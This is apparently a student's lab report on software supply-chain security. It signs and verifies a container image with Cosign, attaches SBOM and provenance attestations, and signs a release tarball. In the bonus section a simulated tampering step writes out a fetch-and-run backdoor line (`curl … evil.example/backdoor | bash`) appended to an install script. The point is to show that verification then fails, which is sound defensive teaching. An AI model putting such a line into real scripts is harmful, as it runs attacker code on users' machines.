# Lab 8 — Supply Chain: Signing, Tampering, and Attestation

Tooling: Cosign v3.0.2 (not 3.1.x, which drops `--tlog-upload=false`), Docker, jq, on macOS 15.3.1 (arm64).
Registry: `registry:3` local. SBOM predicate: `labs/lab4/juice-shop.cdx.json` from Lab 4.

Two forced environment deviations, noted here:

1. Port 5001, not 5000. macOS runs an AirPlay Receiver (`ControlCenter`, `Server: AirTunes/845.5.1`)
   on `*:5000`, which intercepts `localhost:5000` and answers `cosign` with `403 Forbidden` before Docker's
   `127.0.0.1:5000` binding is ever reached. Disabling it needs System Settings, so the registry is published
   on `127.0.0.1:5001` instead. Every command below uses `localhost:5001`.
2. The signed digest came from the registry, not `docker inspect`. `bkimminich/juice-shop:v20.0.0` is a
   multi-arch image; pushing it to the local registry on an arm64 Mac pushes only the single-platform
   manifest (`Not all multiplatform-content is present`). `docker inspect ... RepoDigests` still reports the
   Docker Hub *index* digest `sha256:fd58bdc9…`, which was never pushed to the local registry, so signing it
   fails with `MANIFEST_UNKNOWN`. The digest the registry actually serves is its `Docker-Content-Digest`
   header, `sha256:cbdfc00de875…`, and that is what I signed. Querying the registry is a more reliable way to
   pick the digest than `docker inspect` in the multi-platform case.

## Task 1

### The digest I signed, and how I picked it

```console
$ curl -sD- -o /dev/null -H 'Accept: application/vnd.docker.distribution.manifest.v2+json' \
    http://localhost:5001/v2/juice-shop/manifests/v20.0.0 | grep -i docker-content-digest
Docker-Content-Digest: sha256:cbdfc00de875926f20ff603fac73c5b68577e37680cf2e0c324adda42ffc1113
```

Signed reference: `localhost:5001/juice-shop@sha256:cbdfc00de875926f20ff603fac73c5b68577e37680cf2e0c324adda42ffc1113`.
I took it from the registry's `Docker-Content-Digest` rather than from `docker inspect`, because `docker
inspect` reported the Docker Hub index digest that does not exist in this registry.

### `cosign verify` on the signed image succeeds

```console
$ cosign verify --key labs/lab8/keys/cosign.pub --insecure-ignore-tlog \
    --allow-insecure-registry localhost:5001/juice-shop@sha256:cbdfc00de875…
The following checks were performed on each of these signatures:
  - The cosign claims were validated
  - Existence of the claims in the transparency log was verified offline
  - The signatures were verified against the specified public key
```

The verified payload's `docker-manifest-digest` is `sha256:cbdfc00de875…`, matching what I signed.

### The swap, and the failure quoted exactly

I overwrote the `v20.0.0` tag with `alpine:3.20`; the tag now resolves to `sha256:45e09956dc667…`.
Verifying that new digest:

```console
$ cosign verify --key labs/lab8/keys/cosign.pub --insecure-ignore-tlog \
    --allow-insecure-registry localhost:5001/juice-shop@sha256:45e09956dc667…
Error: no signatures found
error during command execution: no signatures found
```

The original digest still verifies afterward. A signature binds to content, not to the tag:

```console
$ cosign verify --key labs/lab8/keys/cosign.pub --insecure-ignore-tlog \
    --allow-insecure-registry localhost:5001/juice-shop@sha256:cbdfc00de875…
  - The cosign claims were validated
  - The signatures were verified against the specified public key
```

### What the signature is actually bound to

The signature is bound to the digest, the SHA-256 hash of the image manifest, not to the name
`juice-shop:v20.0.0`. Cosign stores the signature in the registry under a tag derived from that digest
(`sha256-cbdfc00de875….sig`), so "verify this image" means "fetch the content the digest names, hash it, and
check a signature exists over that exact hash." When the attacker re-pointed the `v20.0.0` tag at Alpine, the
tag resolved to a different digest (`45e09956…`), cosign looked for a signature over that hash, found none, and
failed closed with `no signatures found`. Had signatures been bound to tags instead, the attack would have
succeeded silently: the signature "for `v20.0.0`" would still be present, verification would pass, and every
consumer would run Alpine believing it was the image I signed. That is the class of attack digest binding
exists to defeat.

### Aside: the private key is refused three ways

`git add labs/lab8/keys/cosign.key` is blocked by Lab 3's gitleaks pre-commit hook (`leaks found: 2`), the
key is also matched by the `*.key` line in `.gitignore`, so it is never even staged, and only `cosign.pub`
is committed. The PEM header is `BEGIN ENCRYPTED SIGSTORE PRIVATE KEY`, not the standard
`BEGIN … PRIVATE KEY`, so `detect-private-key` alone might miss it; gitleaks is what catches this one.

## Task 2

### Component counts match

```console
$ jq '.components | length' labs/lab4/juice-shop.cdx.json
3068
$ jq '.components | length' labs/lab8/results/sbom-from-attestation.json
3068
```

The SBOM extracted from the verified attestation is byte-for-byte the predicate I attached.

### The two `predicateType`s, read from the verified payload

```console
$ cosign verify-attestation … --type cyclonedx      … | jq -r '.payload|@base64d|fromjson|.predicateType'
https://cyclonedx.org/bom
$ cosign verify-attestation … --type slsaprovenance … | jq -r '.payload|@base64d|fromjson|.predicateType'
https://slsa.dev/provenance/v0.2
```

### The decoded statement, and where each field came from

```json
{
  "_type": "https://in-toto.io/Statement/v0.1",
  "subject": [
    { "name": "localhost:5001/juice-shop",
      "digest": { "sha256": "cbdfc00de875926f20ff603fac73c5b68577e37680cf2e0c324adda42ffc1113" } }
  ],
  "predicateType": "https://cyclonedx.org/bom"
}
```

| Field | Value | Origin |
|---|---|---|
| `_type` | `https://in-toto.io/Statement/v0.1` | Cosign. The in-toto Statement wrapper; note it is `v0.1`, not `v1`, as I predicted hand-writing the envelope in the Lab 4 bonus |
| `subject[0].name` / `.digest` | the registry ref + `cbdfc00de875…` | Cosign, derived from the image digest I ran `attest` against |
| `predicateType` | `https://cyclonedx.org/bom` | Cosign, chosen by `--type cyclonedx`; unversioned, again matching the Lab 4 prediction |
| `predicate` (the SBOM body) | the 3068-component CycloneDX doc | Me, the `--predicate labs/lab4/juice-shop.cdx.json` file |

So I supplied only the predicate body; cosign filled in the statement type, the subject binding and the
predicate type. The same holds for `--type slsaprovenance`: I gave only the `builder`/`buildType`/`invocation`
body (no `_type`, no `subject`), and cosign wrapped it, which is why the file had none of those.

### Morning after the next Log4Shell, two thousand images

A signature alone answers "is this image unchanged since someone signed it?". It cannot answer "does this
image contain the vulnerable library?". The SBOM attestation does: I can iterate every image in the registry,
run `cosign verify-attestation --type cyclonedx` on each one, and `jq` the predicate for the affected package
and version. That turns "which of two thousand images ship log4j-core 2.14?" from a frantic
rebuild-and-rescan of everything into a query that runs in minutes against attestations already on the shelf,
with cryptographic proof the inventory belongs to that exact image. Three things still have to be true at 3am
for that to work. The attestations must already exist (you cannot attest your way out of an incident after it
starts; this is a build-time investment). They must be signed by a key you still trust and can still verify
against (the public key, or a keyless identity plus Rekor, has to be reachable and uncompromised). And the
SBOMs must be complete and current: an attestation generated once and never regenerated describes an image's
dependencies as they were at build, and Lab 4 showed Syft's catalogue has real blind spots. A stale inventory
will report an image as safe when it is not.

## Bonus: sign the thing people curl

### Verified OK, then the failure after modification

```console
$ cosign verify-blob --key labs/lab8/keys/cosign.pub \
    --bundle labs/lab8/results/my-tool.tar.gz.bundle --insecure-ignore-tlog \
    labs/lab8/results/my-tool.tar.gz
Verified OK
```

Then, as the attacker, I appended `curl -s https://evil.example/backdoor | bash` to `install.sh`, rebuilt the
tarball, and did not re-sign. Verifying the modified tarball against the original bundle:

```console
$ cosign verify-blob --key … --bundle …my-tool.tar.gz.bundle --insecure-ignore-tlog my-tool.tar.gz
Error: failed to verify signature: could not verify message: invalid signature when validating ASN.1 encoded signature
error during command execution: failed to verify signature: could not verify message: invalid signature when validating ASN.1 encoded signature
```

### The two files a consumer needs, and the channel problem

A consumer needs (1) the signer's public key (`cosign.pub`) and (2) the signature bundle
(`my-tool.tar.gz.bundle`), in addition to the artifact itself. The bundle may travel over the same channel as
the artifact (the same CDN, the same release page), because it is useless to an attacker: tampering with the
artifact invalidates it, and tampering with the bundle makes it fail to verify against the public key. The
public key must not. If the attacker who swaps the download can also swap the public key you check against,
they re-sign their backdoored tarball with their own key and hand you the matching key, and verification
passes. The public key has to arrive out-of-band and be pinned: a different origin, a package manager's trust
store, a keyring shipped with the OS, anywhere the attacker who controls the CDN cannot also control.

### Install instructions that cannot be given a modified script

1. Get the public key from a source independent of the download CDN, and check its fingerprint against my
   site, keybase, or an OS keyring (`cosign.pub`, SHA256 = `<published fingerprint>`).
2. Download the artifact and its bundle. The same CDN is fine for these two:

```bash
curl -fsSLO https://downloads.example/my-tool.tar.gz
curl -fsSLO https://downloads.example/my-tool.tar.gz.bundle
```

3. Verify before running:

```bash
cosign verify-blob --key cosign.pub --bundle my-tool.tar.gz.bundle my-tool.tar.gz
```

4. Only if that prints `Verified OK`, extract and run:

```bash
tar -xzf my-tool.tar.gz && ./install.sh
```

Codecov's uploader was signed by nobody and verified by nobody, so a modified script on the CDN ran in
thousands of pipelines with no way to notice. The step that fixes it, and the one most projects skip, is step
3: verifying before executing. The usual norm is still `curl … | bash`, which pipes an unverified, unseen
script straight into a shell, exactly the pattern that made Codecov possible. Publishing a signature does
nothing if the install instructions never tell the user to check it. The value is in making verification a
required step the user actually performs, with the public key obtained from somewhere the CDN attacker does
not control.
